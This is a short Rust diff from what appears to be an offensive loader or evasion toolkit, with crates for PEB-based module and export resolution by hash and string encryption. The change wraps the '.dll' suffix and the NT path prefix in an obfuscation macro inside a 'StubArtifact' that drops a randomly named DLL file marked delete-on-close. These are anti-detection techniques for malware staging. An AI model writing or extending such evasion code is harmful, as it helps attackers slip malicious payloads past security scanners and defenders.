@@ -6,7 +6,7 @@ use alloc::vec::Vec;
 use core::ffi::c_void;
 use opsec_bootstrap::Bootstrap;
 use opsec_peb::{resolve_export, resolve_module};
-use opsec_strcrypt::hash;
+use opsec_strcrypt::{hash, obf};
 
 pub struct StubArtifact<'b> {
     pub bs: &'b Bootstrap,
@@ -38,7 +38,13 @@ impl<'b> StubArtifact<'b> {
             }
 
             // Create file with FILE_DELETE_ON_CLOSE
-            let dos_path = alloc::format!("{}\\{}.dll", dos_dir, rand);
+            let dll_suffix = obf!(".dll");
+            let dos_path = alloc::format!(
+                "{}\\{}{}",
+                dos_dir,
+                rand,
+                core::str::from_utf8(dll_suffix.as_bytes()).unwrap_or(""),
+            );
             let mut file_nt = nt_path_zwide(&dos_path);
             let handle = crate::fs::create_file_delete_on_close(bs, &mut file_nt)?;
 
@@ -83,7 +89,9 @@ impl Drop for StubArtifact<'_> {
 }
 
 fn nt_path_zwide(dos: &str) -> Vec<u16> {
-    let mut v: Vec<u16> = alloc::format!("\\??\\{}", dos).encode_utf16().collect();
+    let pfx = obf!("\\??\\");
+    let prefix = core::str::from_utf8(pfx.as_bytes()).unwrap_or("");
+    let mut v: Vec<u16> = alloc::format!("{}{}", prefix, dos).encode_utf16().collect();
     v.push(0);
     v
 }
